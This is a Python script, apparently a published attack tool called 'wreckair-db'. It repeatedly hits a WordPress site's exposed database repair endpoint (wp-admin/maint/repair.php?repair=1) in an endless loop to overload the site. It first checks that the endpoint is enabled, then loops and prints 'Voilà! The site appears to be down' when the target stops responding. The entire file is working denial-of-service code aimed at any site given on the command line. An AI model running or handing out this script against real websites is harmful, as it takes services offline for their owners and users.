#!/usr/bin/env python3
import sys
import time
import requests
from urllib.parse import urljoin
from datetime import datetime

print('''
    ██╗    ██╗██████╗ ███████╗ ██████╗██╗  ██╗ █████╗ ██╗██████╗       ██████╗ ██████╗ 
    ██║    ██║██╔══██╗██╔════╝██╔════╝██║ ██╔╝██╔══██╗██║██╔══██╗      ██╔══██╗██╔══██╗
    ██║ █╗ ██║██████╔╝█████╗  ██║     █████╔╝ ███████║██║██████╔╝█████╗██║  ██║██████╔╝
    ██║███╗██║██╔══██╗██╔══╝  ██║     ██╔═██╗ ██╔══██║██║██╔══██╗╚════╝██║  ██║██╔══██╗
    ╚███╔███╔╝██║  ██║███████╗╚██████╗██║  ██╗██║  ██║██║██║  ██║      ██████╔╝██████╔╝
    ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝      ╚═════╝ ╚═════╝
    Authored by : @smaranchand | https://smaranchand.com.np
      ''')

def print_usage():
    print("Usage: wreckair-db.py vulnerablewebsite.com/subpath")
    sys.exit(1)

def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        if check_site_status('http://' + url):
            return 'http://' + url
        elif check_site_status('https://' + url):
            return 'https://' + url
        else:
            print("[ERROR] Target site is not reachable via HTTP or HTTPS.")
            sys.exit(1)
    return url

def check_site_status(url):
    try:
        response = requests.get(url, timeout=7, allow_redirects=True)
        return response.status_code == 200
    except requests.RequestException:
        return False

def check_repair_endpoint(url):
    repair_endpoint = urljoin(url, "wp-admin/maint/repair.php")
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Referer": url,
            "Connection": "keep-alive",
        }
        response = requests.get(repair_endpoint, headers=headers, timeout=7, allow_redirects=True)
        response.encoding = 'utf-8'

        if response.status_code == 200:
            if "repair=1" in response.text or "repair.php?repair=1" in response.text:
                print(f"[INFO] DB Repair endpoint is available and ready.")
                return True
            else:
                print(f"[WARNING] Repair function not enabled in the target.")
        else:
            print(f"[WARNING] Repair path not found, Status code: {response.status_code}")
    except requests.RequestException:
        print(f"[INFO] Could not connect to DB repair endpoint.")
    return False

def make_site_busy(url):
    busy_url = urljoin(url, "wp-admin/maint/repair.php?repair=1")
    start_time = datetime.now()
    print(f"[INFO] Starting DB repair test on: {url}")
    try:
        while True:
            try:
                response = requests.get(busy_url, timeout=7, allow_redirects=True)
                elapsed_time = datetime.now() - start_time
                elapsed_seconds = elapsed_time.total_seconds()
                if response.status_code == 200:
                    print(f"[INFO] Site is still responding. (Elapsed time: {elapsed_seconds:.2f} seconds)")
            except requests.RequestException:
                elapsed_time = datetime.now() - start_time
                elapsed_seconds = elapsed_time.total_seconds()
                print(f"[SUCCESS] Voilà! The site appears to be down. (Elapsed time: {elapsed_seconds:.2f} seconds)")
                time.sleep(8)
    except KeyboardInterrupt:
        total_elapsed_time = datetime.now() - start_time
        total_elapsed_seconds = total_elapsed_time.total_seconds()
        print(f"\n[INFO] Stopped by user. Total elapsed time: {total_elapsed_seconds:.2f} seconds")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print_usage()

    target = sys.argv[1]
    target = validate_url(target)

    if check_site_status(target):
        if check_repair_endpoint(target):
            make_site_busy(target)
        else:
            print(f"[EXIT] Cannot proceed with test.")
    else:
        print(f"[INFO] The site {target} is not available.")
